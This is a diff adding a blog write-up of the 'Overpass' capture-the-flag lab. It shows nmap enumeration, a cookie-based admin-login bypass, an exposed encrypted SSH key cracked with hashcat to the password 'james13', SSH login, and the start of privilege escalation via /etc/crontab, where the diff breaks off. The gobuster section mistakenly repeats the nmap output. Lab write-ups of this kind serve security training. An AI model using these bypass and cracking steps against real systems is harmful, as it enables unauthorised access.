@@ -12,20 +12,20 @@
     <title>Overpass - SasquatchMitch</title>
 
     
-    <link href="/css/nucleus.css?1677629191" rel="stylesheet">
-    <link href="/css/fontawesome-all.min.css?1677629191" rel="stylesheet">
-    <link href="/css/hybrid.css?1677629191" rel="stylesheet">
-    <link href="/css/featherlight.min.css?1677629191" rel="stylesheet">
-    <link href="/css/perfect-scrollbar.min.css?1677629191" rel="stylesheet">
-    <link href="/css/auto-complete.css?1677629191" rel="stylesheet">
-    <link href="/css/atom-one-dark-reasonable.css?1677629191" rel="stylesheet">
-    <link href="/css/theme.css?1677629191" rel="stylesheet">
-    <link href="/css/tabs.css?1677629191" rel="stylesheet">
-    <link href="/css/hugo-theme.css?1677629191" rel="stylesheet">
+    <link href="/css/nucleus.css?1677721703" rel="stylesheet">
+    <link href="/css/fontawesome-all.min.css?1677721703" rel="stylesheet">
+    <link href="/css/hybrid.css?1677721703" rel="stylesheet">
+    <link href="/css/featherlight.min.css?1677721703" rel="stylesheet">
+    <link href="/css/perfect-scrollbar.min.css?1677721703" rel="stylesheet">
+    <link href="/css/auto-complete.css?1677721703" rel="stylesheet">
+    <link href="/css/atom-one-dark-reasonable.css?1677721703" rel="stylesheet">
+    <link href="/css/theme.css?1677721703" rel="stylesheet">
+    <link href="/css/tabs.css?1677721703" rel="stylesheet">
+    <link href="/css/hugo-theme.css?1677721703" rel="stylesheet">
     
     
 
-    <script src="/js/jquery-3.3.1.min.js?1677629191"></script>
+    <script src="/js/jquery-3.3.1.min.js?1677721703"></script>
 
     <style>
       :root #header + #content > #left > #rlblock_left{
@@ -51,14 +51,14 @@
     <span data-search-clear=""><i class="fas fa-times"></i></span>
 </div>
 
-<script type="text/javascript" src="/js/lunr.min.js?1677629191"></script>
-<script type="text/javascript" src="/js/auto-complete.js?1677629191"></script>
+<script type="text/javascript" src="/js/lunr.min.js?1677721703"></script>
+<script type="text/javascript" src="/js/auto-complete.js?1677721703"></script>
 <script type="text/javascript">
     
         var baseurl = "\/";
     
 </script>
-<script type="text/javascript" src="/js/search.js?1677629191"></script>
+<script type="text/javascript" src="/js/search.js?1677721703"></script>
 
     
   </div>
@@ -430,7 +430,13 @@
                 
                     <div class="progress">
     <div class="wrapper">
-<nav id="TableOfContents"></nav>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#admin-page--ssh">Admin page &amp; ssh</a></li>
+    <li><a href="#privesc">Privesc</a></li>
+  </ul>
+</nav>
     </div>
 </div>
 
@@ -453,7 +459,187 @@
         
 
 
+<h2 id="enumeration">Enumeration</h2>
+<p>Nmap Scan</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ nmap -sC -sV 10.10.164.133                              
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-03-01 19:58 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.164.133
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.20s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 37968598d1009c1463d9b03475b1f957 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5375fac065daddb1e8dd40b8f6823924 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 1c4ada1f36546da6c61700272e67759c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Golang net/http server <span style="color:#f92672">(</span>Go-IPFS json-rpc or InfluxDB API<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Overpass
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 37.03 seconds
+</span></span></code></pre></div><p>Gobuster scan</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ nmap -sC -sV 10.10.164.133                              
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-03-01 19:58 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.164.133
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.20s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 37968598d1009c1463d9b03475b1f957 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5375fac065daddb1e8dd40b8f6823924 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 1c4ada1f36546da6c61700272e67759c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Golang net/http server <span style="color:#f92672">(</span>Go-IPFS json-rpc or InfluxDB API<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Overpass
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 37.03 seconds
+</span></span></code></pre></div><h2 id="admin-page--ssh">Admin page &amp; ssh</h2>
+<p>After finding the admin page using gobuster I went to it in a browser, got to the login screen and tried some typical default credentials with no luck, time to look at the source code.</p>
+<p>This brought me to the login.js script and this section of code stood out to me.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">login</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">usernameBox</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;#username&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">passwordBox</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;#password&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">loginStatus</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;#loginStatus&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">loginStatus</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">creds</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">usernameBox</span>.<span style="color:#a6e22e">value</span>, <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">passwordBox</span>.<span style="color:#a6e22e">value</span> }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">postData</span>(<span style="color:#e6db74">&#34;/api/login&#34;</span>, <span style="color:#a6e22e">creds</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">statusOrCookie</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">statusOrCookie</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;Incorrect credentials&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">loginStatus</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Incorrect Credentials&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">passwordBox</span>.<span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Cookies</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#34;SessionToken&#34;</span>,<span style="color:#a6e22e">statusOrCookie</span>)
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/admin&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Set a cookie called &ldquo;SessionToken&rdquo; with a value of &ldquo;correctcredentials&rdquo; &hellip; and success, we get an ssh key.</p>
+<pre tabindex="0"><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
 
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
+</code></pre><p>chmod 600 on the key and ssh in &hellip; need a password. Run ssh2john to get a hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b
+</span></span></code></pre></div><p>use hashcat and get james13 as the password</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Dictionary cache hit:
+</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921507</span>
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$sshng$1$16$9f85d92f34f42626f13a7493ab48f337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b:james13
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">22931</span> <span style="color:#f92672">(</span>RSA/DSA/EC/OpenSSH Private Keys <span style="color:#f92672">(</span>$1, $3$<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: $sshng$1$16$9f85d92f34f42626f13a7493ab48f337$1200$2...bfc53b
+</span></span><span style="display:flex;"><span>Time.Started.....: Wed Mar  <span style="color:#ae81ff">1</span> 20:14:13 <span style="color:#ae81ff">2023</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Wed Mar  <span style="color:#ae81ff">1</span> 20:14:13 <span style="color:#ae81ff">2023</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Speed.#1.........:   458.5 kH/s <span style="color:#f92672">(</span>0.15ms<span style="color:#f92672">)</span> @ Accel:256 Loops:1 Thr:1 Vec:8
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Progress.........: 13568/14344385 <span style="color:#f92672">(</span>0.09%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Rejected.........: 0/13568 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Point....: 13312/14344385 <span style="color:#f92672">(</span>0.09%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>Candidates.#1....: <span style="color:#ae81ff">120806</span> -&gt; sugar123
+</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Util: 99%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Wed Mar  <span style="color:#ae81ff">1</span> 20:13:11 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>Stopped: Wed Mar  <span style="color:#ae81ff">1</span> 20:14:15 <span style="color:#ae81ff">2023</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ ssh -i id_rsa james@10.10.15.117 
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.15.117 (10.10.15.117)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This host key is known by the following other names/addresses:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:16: [hashed name]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:18: [hashed name]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.15.117<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Enter passphrase for key &#39;</span>id_rsa<span style="color:#960050;background-color:#1e0010">&#39;</span>: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-108-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> System information disabled due to load higher than 1.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates are security updates.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Sat Jun <span style="color:#ae81ff">27</span> 04:45:40 <span style="color:#ae81ff">2020</span> from 192.168.170.1
+</span></span><span style="display:flex;"><span>james@overpass-prod:~$ ls
+</span></span><span style="display:flex;"><span>todo.txt  user.txt
+</span></span></code></pre></div><h2 id="privesc">Privesc</h2>
+<p>Find something interesting when looking at the /etc/crontab file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>james@overpass-prod:~$ cat /etc/crontab
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># command to install the new version when you edit this file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># that none of the other crontabs do.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># m h dom mon dow user  command</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
